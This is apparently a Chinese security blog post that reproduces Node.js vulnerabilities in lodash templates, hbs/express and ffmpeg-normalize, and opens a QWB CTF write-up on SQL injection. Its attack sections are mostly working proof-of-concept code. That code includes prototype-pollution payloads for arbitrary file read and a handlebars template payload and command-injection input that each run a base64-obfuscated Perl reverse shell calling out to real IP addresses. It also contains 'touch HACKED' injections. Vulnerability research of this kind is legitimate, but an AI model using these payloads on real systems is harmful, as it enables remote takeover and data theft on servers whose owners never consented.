<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">name = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;echo 123&gt;&gt;HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27; &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>有参数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">name = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;echo 123&gt;&gt;HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27; &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>两者生成的参数是一样的，问题就在于若输入参数了，name就不再是我们设置的默认值，这样的话就会导致参数不再受控制。</p>
<p><img src="image-20210624165310430.png" alt="image-20210624165310430"></p>
<p>怪不得这个漏洞只有5.5分，这个的利用条件过于苛刻了,先不说哪个开发人员没事会用这个函数 ，又只会在很少的情况下出现定义了模板却不赋值的情况</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="comment">// obj.__proto__.variable = &quot;epithet = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;))&#123; console.log(123); &#125;//&quot;;</span></span><br><span class="line">obj.__proto__.variable = <span class="string">&quot;name = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;echo 123&gt;&gt;HELLO&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot; &lt;%= name %&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a; <span class="comment">// 假设a为从数据库中打出来的值,并没有搜索到值返回了一个空值的情况下才有可能诞生漏洞。</span></span><br><span class="line"><span class="keyword">var</span> c = compiled(a);</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br></pre></td></tr></table></figure>



<h1 id="6-hbs框架与express的缺陷"><a href="#6-hbs框架与express的缺陷" class="headerlink" title="6. hbs框架与express的缺陷"></a>6. hbs框架与express的缺陷</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.shoebpatel.com&#x2F;2021&#x2F;01&#x2F;23&#x2F;The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps&#x2F;</span><br></pre></td></tr></table></figure>



<p>这是express的天生的问题了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看这两行代码，感觉是不是毫无缺陷？但是却会造成很严重的后果，打开DEBUG模式跟着调，我们可以很明显的发现我们的第二段输入被设计到了options当中</p>
<p><img src="image-20210624203415511.png" alt="image-20210624203415511"></p>
<p>和ejs一样，我们快进到 tryRender函数里，这里用的hbs框架，所以就会自动的切进去之后会进入一长串的缓存处理当中，可以忽略不计，直到这一行</p>
<p><img src="image-20210624203728753.png" alt="image-20210624203728753"></p>
<p>我们发现options又被原封不动的导入进来了在144行当中又取了options的layout</p>
<p><img src="image-20210624203815875.png" alt="image-20210624203815875"></p>
<p>之后就直接的取出layout中的路径</p>
<p><img src="image-20210624204005095.png" alt="image-20210624204005095"></p>
<p>当能够读取到东西的时候，调用 tryReadFileAndCache函数。</p>
<p><img src="image-20210624204109775.png" alt="image-20210624204109775"></p>
<p>读取文件，再之后就直接</p>
<p><img src="image-20210624204208342.png" alt="image-20210624204208342"></p>
<p>把layout直接渲染上去了，造成了任意文件读取。</p>
<p>总结：</p>
<p>​    其实造成这样的问题有两个</p>
<ul>
<li>express的渲染机制问题，express会毫无条件的接收所有的东西，并允许这些插件进行互相的调用</li>
<li>开发者不应该接收全部的参数，而应该选择的进行接收，但是，例如这样子来写：</li>
</ul>
<p><img src="image-20210624204736513.png" alt="image-20210624204736513"></p>
<p>但是即使是这样的操作，也依然可能导致被读取文件，因为可以进行原型链的污染。这样子会导致用户每次渲染参数都会导致被读取任意文件！</p>
<p>poc:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">	obj.__proto__.layout = <span class="string">&quot;../../../../../../../../flag.txt&quot;</span></span><br><span class="line">	<span class="built_in">console</span>.log([].layout);</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, &#123;profile&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="image-20210624205016453.png" alt="image-20210624205016453"></p>
<p>但是仅仅是任意文件读取并不能兄弟满足，如果我们可以RCE就更好了。</p>
<p>RCE文章</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.z3ratu1.cn&#x2F;%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html</span><br></pre></td></tr></table></figure>



<p>RCE的前提：</p>
<ul>
<li><p>hbs的版本 低于 4.0.3</p>
<ul>
<li>能够上传带有后缀的文件(不是hbs结尾的也完全没问题)</li>
</ul>
</li>
</ul>
<p>上传文件1.jpg：</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% raw %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iODEuNjkuMjAxLjY1IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash&#x27;);&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">&#123;% endraw %&#125;</span></span><br></pre></td></tr></table></figure>

<p>回到</p>
<p><img src="image-20210624210219027.png" alt="image-20210624210219027"></p>
<p>成功getshell！！</p>
<p><img src="image-20210624210233392.png" alt="image-20210624210233392"></p>
<h1 id="7-ffmpeg-normalize"><a href="#7-ffmpeg-normalize" class="headerlink" title="7.ffmpeg-normalize"></a>7.ffmpeg-normalize</h1><p>版本：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ffmpeg-normalize&quot;</span>: <span class="string">&quot;^1.8.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>该库是用于处理音频的，可以将我们的音频的声音大小统一（？）我不是很懂，官方给出的使用范例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target:</span><br><span class="line">        &#123;</span><br><span class="line">            input_i: -<span class="number">23</span>,</span><br><span class="line">            input_lra: <span class="number">7.0</span>,</span><br><span class="line">            input_tp: -<span class="number">2.0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Normalized</span></span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Some error happened</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>漏洞产生于input模块，poc：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4; touch HACKED; #&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target: &#123;<span class="attr">input_i</span>: -<span class="number">23</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">false</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log()&#125;);</span><br></pre></td></tr></table></figure>

<p>老样子，在input这里打个断点，函数还是短的，过了几步就看见：</p>
<p><img src="image-20210625202510490.png" alt="image-20210625202510490"></p>
<p><img src="/image-20210625203237131.png" alt="image-20210625203237131"></p>
<p>还就那个执行。</p>
<p><img src="image-20210625203416754.png" alt="image-20210625203416754"></p>
<p><img src="image-20210625203424292.png" alt="image-20210625203424292"></p>
<p>直接命令拼接然后执行了，那是真的简单</p>
<p><img src="image-20210625203511035.png" alt="image-20210625203511035"></p>
<p>所以我们只需要用冒号，然后扣任意代码，之后用#号省略后面的即可！</p>
<p>感觉很多npm的开发人员都是没有什么安全意识，直接拼接命令然后exec。</p>
<p>随手弹个shell</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMS4xNS4yMjQuMTE0IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash #&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target: &#123;<span class="attr">input_i</span>: -<span class="number">23</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">false</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="number">123</span>)&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="%E6%9C%80%E8%BF%91%E7%9A%84node%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210625203828877.png" alt="image-20210625203828877"></p>
<h1 id="8-prisma"><a href="#8-prisma" class="headerlink" title="8.prisma"></a>8.prisma</h1><p>这是一个用于管理数据库连接的第三方库</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Data source</span></span><br><span class="line">datasource db &#123;</span><br><span class="line">  provider = <span class="string">&quot;postgresql&quot;</span></span><br><span class="line">  url      = env(<span class="string">&quot;DATABASE_URL&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generator</span></span><br><span class="line">generator client &#123;</span><br><span class="line">  provider = <span class="string">&quot;prisma-client-js&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Data model</span></span><br><span class="line">model Post &#123;</span><br><span class="line">  id        Int     @id @<span class="keyword">default</span>(autoincrement())</span><br><span class="line">  title     <span class="built_in">String</span></span><br><span class="line">  content   <span class="built_in">String</span>?</span><br><span class="line">  published <span class="built_in">Boolean</span> @<span class="keyword">default</span>(<span class="literal">false</span>)</span><br><span class="line">  author    User?   @relation(fields:  [authorId], <span class="attr">references</span>: [id])</span><br><span class="line">  authorId  Int?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">model User &#123;</span><br><span class="line">  id    Int     @id @<span class="keyword">default</span>(autoincrement())</span><br><span class="line">  email <span class="built_in">String</span>  @unique</span><br><span class="line">  name  <span class="built_in">String</span>?</span><br><span class="line">  posts Post[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="9-关于hbs还就那个踩坑"><a href="#9-关于hbs还就那个踩坑" class="headerlink" title="9. 关于hbs还就那个踩坑"></a>9. 关于hbs还就那个踩坑</h1><p>卷土重来之审计hbs的渲染完整流程。</p>
<p>原本是在做出上面的研究之后想自己搭建一个题目，结果还就疯狂踩坑人了。我真是个大啥比,码的.我在搭环境的时候遇见了一个坑:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">npm install 有时候并不会根据你得package里面的版本走,你可能需要去node_module确认一下</span><br></pre></td></tr></table></figure>

<p>我在写这篇文章的时候就因为上当了,</p>
<p><img src="image-20210627172914274.png" alt="image-20210627172914274"></p>
<p>这里明明给我写的4.0.1,但是实际上进去包里的时候却是4.1.2. 导致payload一直打不通…(为此我一直开着debug模式对着hbs的渲染盯了两天,脑袋都要炸球了),最后终于折腾好了,我们可以想象一个场景.如果我们找到一个用hbs网站处于4.1以下的版本，并且是express，之后如果满足如下两个条件就可以RCE了</p>
<ul>
<li>原型链污染</li>
<li>没有严格的取输出</li>
</ul>
<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>原型链污染的情况，举例（这里我用了PWN2WIN的源码修改了修改来用），核心在这里：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    res.render(<span class="string">&quot;index&quot;</span>, &#123;services&#125;)   </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TEST</span></span><br><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, upload.single(<span class="string">&#x27;file&#x27;</span>), <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = req.file;</span><br><span class="line">    res.send(&#123;<span class="attr">ret_code</span>: <span class="string">&#x27;0&#x27;</span>,<span class="string">&quot;filename&quot;</span>:file.path&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>因为jsonpatch这个是存在原型链污染漏洞的，所以可以这样来污染layout属性</p>
<p><img src="image-20210627174535517.png" alt="image-20210627174535517"></p>
<p>这样子可以读取任意文件，并且如果存在文件上传(这里的文件不拘泥于任何后缀都可以被成功编译)，上传如下恶意文件。</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% raw %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iODEuNjkuMjAxLjY1IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash&#x27;);&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">&#123;% endraw %&#125;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以getshell了。</p>
<h2 id="未对输入进行严格取值"><a href="#未对输入进行严格取值" class="headerlink" title="未对输入进行严格取值"></a>未对输入进行严格取值</h2><p>这种情况更加常见，因为程序员们喜欢这样子做来显得代码更加有条理性，（也更方便）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, profile)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>直接将用户的取值进行渲染，但是用户的输入可以是数组，所以</p>
<p><img src="image-20210627175144942.png" alt="image-20210627175144942"></p>
<p>即可任意文件读取并进行RCE</p>
]]></content>
      <tags>
        <tag>原型链污染</tag>
        <tag>node</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>QWB托纳多</title>
    <url>/2021/06/25/QWB%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    <content><![CDATA[<p>考点：</p>
<ul>
<li>mysql储存引擎新活</li>
<li>SSTI绕过</li>
</ul>
<p>有一个登陆的地方有一个注册的地方，我们如果重复注册用户名的话会报错，那么可以推测源码中先进行了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果username没有重复的再</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> xx (<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>   ) <span class="keyword">values</span> (xxx);</span><br></pre></td></tr></table></figure>



<p>登陆的时候就进行查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>那我们需要保证的是两边都不报错，最简单的方法就是注册一个用户为admin’’ ，同时密码为admin 即可登陆成功。。但我不知道为什么</p>
<p>这里主要是出题人过滤了tables coluns等关键字，导致我们无法直接注入出来表的节构，在这种情况下就需要介绍一下PERFORMANCE_SCHEMA引擎了。</p>
<p><img src="image-20210625153703936.png" alt="image-20210625153703936"></p>
<p>官方的解释是该库主要是用于储存数据库的元数据，我们可以用navicat看一下这个库</p>
<p><img src="image-20210625153937120.png" alt="image-20210625153937120"></p>
<p>其中有一个表file_instances会储存各类数据库的文件路径，故我们若能对其进行查询，就可以得到所有的表名了。</p>
